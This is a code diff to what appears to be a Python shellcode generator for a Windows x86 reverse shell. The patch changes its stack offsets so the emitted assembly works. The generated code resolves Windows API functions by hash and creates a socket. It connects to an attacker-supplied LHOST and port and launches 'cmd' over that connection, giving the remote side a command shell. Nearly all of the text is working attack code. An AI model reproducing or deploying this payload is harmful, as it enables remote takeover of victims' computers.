@@ -144,8 +144,8 @@ lookupFunction:
     mov ebp, esp
     sub esp, 0x08
     xor ebx, ebx
-    mov [ebp + 0x08], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
-    mov [ebp + 0x0C], edx       ; Argv passed into lookupFunction
+    mov [ebp - 0x04], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
+    mov [ebp - 0x08], edx       ; Argv passed into lookupFunction
     mov ebx, [edi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
     add ebx, {_IMAGE_NT_HEADERS.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
     add ebx, edi
@@ -156,7 +156,7 @@ lookupFunction:
     mov edx, edi
     add edx, eax
     mov ecx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
-    mov [ebp + 0x08], ebx       ; Backup EBX since we are going to XOR it
+    mov [ebp - 0x04], ebx       ; Backup EBX since we are going to XOR it
 parseNames:
     jecxz error
     dec ecx
@@ -174,10 +174,10 @@ calcHash:
     add ebx, eax
     jmp calcHash
 calcDone:
-    cmp ebx, [ebp + 0x0C]
+    cmp ebx, [ebp - 0x08]
     jnz parseNames
 findAddress:
-    mov ebx, [ebp + 0x08]       ; Restore EBX value prevously saved
+    mov ebx, [ebp - 0x04]       ; Restore EBX value prevously saved
     mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
     add edx, edi
     xor eax, eax
@@ -204,23 +204,25 @@ error:
 
         for i in range(len(lists["DWORD_LIST"])):
             src += "    mov ecx, 0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() )
-            src += "    mov [ebp+{}], ecx\n".format(hex(write_index))
-            write_index += 4
+            src += "    mov [ebp-{}], ecx\n".format(hex(write_index))
+            write_index -= 4
 
         for i in range(len(lists["WORD_LIST"])):
             src += "    mov cx, 0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
-            src += "    mov [ebp+{}], cx\n".format(hex(write_index))
-            write_index += 2
+            src += "    mov [ebp-{}], cx\n".format(hex(write_index))
+            write_index -= 2
 
         for i in range(len(lists["BYTE_LIST"])):
             src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
-            src += "    mov [ebp+{}], cl\n".format(hex(write_index))
-            write_index += 1
+            src += "    mov [ebp-{}], cl\n".format(hex(write_index))
+            write_index -= 1
 
         src += f"""
-    lea ecx, [ebp + {self.storage_offsets['functionName']}]
+    xor ecx, ecx
+    mov [ebp - {write_index}], cl
+    lea ecx, [ebp - {self.storage_offsets['functionName']}]
     push ecx
-    mov eax, [ebp + {self.storage_offsets['LoadLibraryA']}]
+    mov eax, [ebp - {self.storage_offsets['LoadLibraryA']}]
     call eax
         """
 
@@ -243,7 +245,7 @@ error:
 get_{imports[func]}:
     mov edx, {from_str_to_win_hash(imports[func])}
     call lookupFunction
-    mov [ebp + {self.storage_offsets[imports[func]]}], eax
+    mov [ebp - {self.storage_offsets[imports[func]]}], eax
                 """
 
         return stub
@@ -264,17 +266,9 @@ get_{imports[func]}:
 
         shellcode = f"""
 _start:
+    push ebp
     mov ebp, esp
     sub esp, {self.stack_space}
-
-memsetFuncBuffer:
-    xor eax, eax
-    xor ecx, ecx
-    lea edi, [ebp + {self.storage_offsets["functionName"]}]
-    mov cl, 0x08
-    rep stosd
-
-launch:
     call getKernel32
     mov edi, eax
 """
@@ -285,9 +279,9 @@ launch:
 ; EAX => WSAStartup([in]  WORD      wVersionRequired,
 ;                   [out] LPWSADATA lpWSAData);
 call_WSAStartup:
-    mov eax, [ebp + {self.storage_offsets['WSAStartup']}]
+    mov eax, [ebp - {self.storage_offsets['WSAStartup']}]
 
-    lea ecx, [ebp + {self.storage_offsets['wsaData']}]
+    lea ecx, [ebp - {self.storage_offsets['wsaData']}]
     push ecx
 
     xor ecx, ecx
@@ -303,7 +297,7 @@ call_WSAStartup:
 ;                   [in] GROUP               g,
 ;                   [in] DWORD               dwFlags);
 call_WSASocketA:
-    mov eax, [ebp + {self.storage_offsets['WSASocketA']}]
+    mov eax, [ebp - {self.storage_offsets['WSASocketA']}]
     xor ecx, ecx
     push ecx
     push ecx
@@ -325,20 +319,22 @@ call_connect:
     xor ecx, ecx
     mov cl, {sizeof(sockaddr)}
     push ecx
-    mov dword ptr [ebp + {self.storage_offsets['name'] + 0x04}], {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}
-    mov dword ptr [ebp + {self.storage_offsets['name']}], 0x{pack('<H', lport).hex()}0002
-    lea ecx, [ebp + {self.storage_offsets['name']}]
+
+    mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}
+    mov dword ptr [ebp - {self.storage_offsets['name']}], 0x{pack('<H', lport).hex()}0002
+
+    lea ecx, [ebp - {self.storage_offsets['name']}]
     push ecx
     push esi
-    mov eax, [ebp + {self.storage_offsets['connect']}]
+    mov eax, [ebp - {self.storage_offsets['connect']}]
     call eax
 
 ; [EBX] => typedef struct _STARTUPINFOA {{ }}
 setup_STARTUPINFOA:
-    lea ebx, [ebp + {self.storage_offsets['lpStartupInfo']}]
+    lea ebx, [ebp - {self.storage_offsets['lpStartupInfo']}]
 
 memsetStructBuffer:
-    lea edi, [ebp + {self.storage_offsets['lpStartupInfo']}]
+    lea edi, [ebp - {self.storage_offsets['lpStartupInfo']}]
     xor eax, eax
     xor ecx, ecx
     mov cl, {int( sizeof(_STARTUPINFOA) / 0x04 )}
@@ -364,7 +360,7 @@ initMembers:
 ;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
 ;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
 call_CreateProccessA:
-    lea ecx, [ebp + {self.storage_offsets['lpProcessInformation']}]
+    lea ecx, [ebp - {self.storage_offsets['lpProcessInformation']}]
     push ecx
     push ebx
     xor ecx, ecx
@@ -376,12 +372,12 @@ call_CreateProccessA:
     dec ecx
     push ecx
     push ecx
-    lea ecx, [ebp + {self.storage_offsets['lpCommandLine']}]
+    lea ecx, [ebp - {self.storage_offsets['lpCommandLine']}]
     mov dword ptr [ecx], 0x646d63
     push ecx
     xor ecx, ecx
     push ecx
-    mov eax, [ebp + {self.storage_offsets['CreateProcessA']}]
+    mov eax, [ebp - {self.storage_offsets['CreateProcessA']}]
     call eax
 
 ; EAX => TerminateProcess([in] HANDLE hProcess,
@@ -393,7 +389,7 @@ call_TerminateProcess:
     dec ecx
     push ecx    
 
-    mov eax, [ebp + {self.storage_offsets['TerminateProcess']}]
+    mov eax, [ebp - {self.storage_offsets['TerminateProcess']}]
     call eax
 """
 
